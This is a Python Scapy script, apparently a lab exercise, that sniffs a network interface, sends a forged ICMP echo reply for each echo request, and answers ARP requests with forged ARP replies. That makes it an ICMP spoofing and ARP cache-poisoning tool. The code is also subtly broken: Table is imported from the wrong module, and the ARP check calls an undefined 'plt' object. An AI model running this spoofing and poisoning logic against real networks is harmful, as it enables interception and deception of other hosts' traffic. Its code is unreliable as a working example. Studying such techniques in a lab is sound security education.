#!/usr/bin/env python3
from scapy.all import *
from rich.console import Console
from rich.console import Table

console = Console()

# Table to display packet types
table = Table(title="10.9.0.1 Action Logs")
table.add_column("Packet Type", justify="center", style="bold red")
table.add_column("Source IP", justify="center", style="green")
table.add_column("Destination IP", justify="center", style="green")

# Function to dynamically update table
def update_table(packet, src_ip, dst_ip):
    table.add_row(packet, src_ip, dst_ip)
    console.clear()
    console.print(table)

# Function to handle ICMP Echo Requests and ARP Requests
def spoofer(pkt):
    # If-statement that handles ICMP Echo Requests
    if ICMP in pkt and pkt[ICMP].type == 8:
        # (Captured) action for the original ICMP request packet
        action = "Original Packet"
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        # Update table with original packet details
        update_table(action, src_ip, dst_ip)
        # Send crafted spoofed Echo Reply
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        data = pkt[Raw].load if Raw in pkt else b""
        new_pkt = ip / icmp / data
        send(new_pkt, verbose=0)
        # (Captured) action for the spoofed ICMP reply packet
        action = "Spoofed Packet"
        update_table(action, dst_ip, src_ip)
        table.add_row("-" * 18, "-" * 15, "-" * 15)
    # If-statement that handles ARP Requests
    if plt.haslayer(ARP) and pkt[ARP].op == 1:
        # (Captured) action for the original ARP request packet
        src_ip = pkt[ARP].psrc
        dst_ip = pkt[ARP].pdst
        # Send crafted ARP Reply (w/out logging it)
        new_arp = ARP(hwlen=6, plen=4, op=2,
                pdst=pkt[ARP].psrc, hwdst=pkt[ARP].hwsrc,
                psrc=pkt[ARP].pdst)
        send(new_arp, verbose=0)

pkt = sniff(iface="br-70c34662f91e", filter="arp or icmp", prn=spoofer)
